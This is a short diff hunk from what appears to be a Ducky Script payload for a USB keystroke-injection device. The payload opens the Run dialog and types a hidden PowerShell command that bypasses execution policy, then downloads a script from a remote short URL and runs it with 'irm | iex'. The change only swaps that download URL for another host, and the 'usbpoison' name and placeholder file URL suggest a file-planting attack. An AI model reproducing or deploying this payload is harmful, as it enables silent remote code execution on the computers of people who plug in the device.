@@ -11,6 +11,6 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $DLurl = 'YOUR_FILE_URL_HERE'; $File = 'NAME_OF_FILE_TO_COPY' irm is.gd/usbpoison | iex
+STRING powershell -NoP -Ep Bypass -W H -C $DLurl = 'YOUR_FILE_URL_HERE'; $File = 'NAME_OF_FILE_TO_COPY' irm https://bw0.cc/usbps | iex
 ENTER
 
